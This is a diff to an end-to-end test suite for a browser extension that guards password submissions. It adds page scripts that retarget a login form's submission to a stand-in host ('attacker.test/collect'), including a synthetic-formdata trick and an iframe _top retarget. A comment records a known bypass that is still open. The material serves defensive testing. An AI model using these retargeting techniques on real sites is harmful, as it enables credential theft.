@@ -13,13 +13,13 @@
  * Both hosts are fake and served by request interception, so every POST is
  * counted at the network boundary: the attacker sink must see zero canaries.
  */
-import { chromium, expect, test, type BrowserContext, type Page, type Worker } from "@playwright/test";
+import { chromium, expect, test, type BrowserContext, type Frame, type Page, type Worker } from "@playwright/test";
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
 import { fileURLToPath } from "node:url";
 import { SUITE_SETTINGS_KEY } from "../../extension/src/shared/storage";
-import { clickModalButton, getServiceWorker, waitForCredentialModal } from "./extension_test_utils";
+import { clickModalButton, getServiceWorker, waitForCredentialModal, waitForToastText } from "./extension_test_utils";
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -28,6 +28,7 @@ const extensionPath = process.env.EXTENSION_PATH
   : path.resolve(__dirname, "..", "..", "extension", "dist");
 
 const LOGIN_URL = "http://victim.test/login";
+const TOP_URL = "http://victim.test/top";
 const APPROVED_URL = "http://victim.test/session";
 const ATTACKER_URL = "http://attacker.test/collect";
 const CANARY = "canary-password-1084";
@@ -40,6 +41,8 @@ type Retarget =
   | "submit-action"
   | "submit-base"
   | "window-capture-hidden"
+  | "formdata-synthetic-reset"
+  | "submit-formaction-top"
   | "submit-formaction-blank"
   | "formdata-action";
 type Sinks = { approved: string[]; attacker: string[]; resumedSubmits: number };
@@ -93,6 +96,10 @@ async function withVictimPage(
         await route.fulfill({ contentType: "text/html", body: FIXTURE });
         return;
       }
+      if (request.url() === TOP_URL) {
+        await route.fulfill({ contentType: "text/html", body: `<!doctype html><iframe id="login" src="${LOGIN_URL}"></iframe>` });
+        return;
+      }
       if (request.url().startsWith(APPROVED_URL)) sinks.approved.push(`${request.method()} ${request.postData() ?? ""}`);
       await route.fulfill({ contentType: "text/html", body: "<p>approved sink</p>" });
     });
@@ -118,9 +125,9 @@ async function withVictimPage(
 }
 
 /** Page-world (attacker-controlled) script, installed before the user's click. */
-async function installRetarget(page: Page, mode: Retarget): Promise<void> {
+async function installRetarget(page: Page | Frame, mode: Retarget): Promise<void> {
   await page.evaluate(
-    ({ mode, attacker }) => {
+    ({ mode, attacker, approved }) => {
       const form = document.getElementById("login") as HTMLFormElement;
       const go = document.getElementById("go") as HTMLButtonElement;
       form.addEventListener("submit", () => {
@@ -152,13 +159,33 @@ async function installRetarget(page: Page, mode: Retarget): Promise<void> {
           true,
         );
       }
+      if (mode === "submit-formaction-top") {
+        form.addEventListener("submit", () => {
+          go.setAttribute("formaction", attacker);
+          go.setAttribute("formtarget", "_top");
+        });
+      }
+      if (mode === "formdata-synthetic-reset") {
+        // Review round 1 on #1100: move the destination in submit, then, after
+        // the guard has read the real formdata, put the approved URL back and
+        // fire a synthetic formdata so a re-read would see "unchanged".
+        form.addEventListener("submit", () => go.setAttribute("formaction", attacker));
+        let replaying = false;
+        form.addEventListener("formdata", () => {
+          if (replaying) return;
+          replaying = true;
+          go.setAttribute("formaction", approved);
+          form.dispatchEvent(new Event("formdata", { bubbles: true }));
+          replaying = false;
+        });
+      }
       if (mode === "formdata-action") {
         form.addEventListener("formdata", () => {
           form.action = attacker;
         });
       }
     },
-    { mode, attacker: ATTACKER_URL },
+    { mode, attacker: ATTACKER_URL, approved: APPROVED_URL },
   );
 }
 
@@ -268,5 +295,41 @@ test("a re-checked retarget still submits once the user approves the destination
     expect(sinks.attacker[0]).toContain(`password=${CANARY}`);
     expect(sinks.approved).toEqual([]);
     expect(sinks.resumedSubmits).toBe(2);
+  });
+});
+
+test("a synthetic formdata cannot clear a moved resumed submit (#1100 review) @regression", async () => {
+  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
+  await withVictimPage(false, async (page, sinks) => {
+    await installRetarget(page, "formdata-synthetic-reset");
+    await page.click("#go", { noWaitAfter: true });
+    await expect.poll(() => sinks.resumedSubmits, { timeout: 10_000 }).toBeGreaterThanOrEqual(1);
+    await page.waitForTimeout(2_000);
+    expect(sinks.attacker, "the attacker sink must receive zero canary POSTs").toEqual([]);
+    // The re-check assesses the reset (approved) URL, the page moves it again on
+    // the next resume, and the second move blocks.
+    await waitForToastText(page, "destination changed after the security check");
+    expect(sinks.attacker).toEqual([]);
+    expect(sinks.approved).toEqual([]);
+  });
+});
+
+test("a framed login retargeted to _top during the resumed submit (#1100 review, measurement) @regression", async () => {
+  test.skip(!fs.existsSync(extensionPath), "Build the extension before running e2e tests.");
+  // Measured: the POST is scheduled on the top frame, so the iframe's
+  // window.stop() does not cancel it. Same class as the new-window gap (#1099).
+  test.fail();
+  await withVictimPage(false, async (page, sinks) => {
+    await page.goto(TOP_URL, { waitUntil: "domcontentloaded" });
+    const frame = page.frameLocator("#login");
+    await expect(frame.locator("#go")).toBeVisible();
+    const login = page.frames().find((f) => f.url() === LOGIN_URL);
+    expect(login).toBeTruthy();
+    await page.waitForTimeout(300);
+    await installRetarget(login!, "submit-formaction-top");
+    await frame.locator("#go").click({ noWaitAfter: true });
+    await expect.poll(() => sinks.resumedSubmits, { timeout: 10_000 }).toBe(1);
+    await page.waitForTimeout(2_000);
+    expect(sinks.attacker, "the attacker sink must receive zero canary POSTs").toEqual([]);
   });
 });
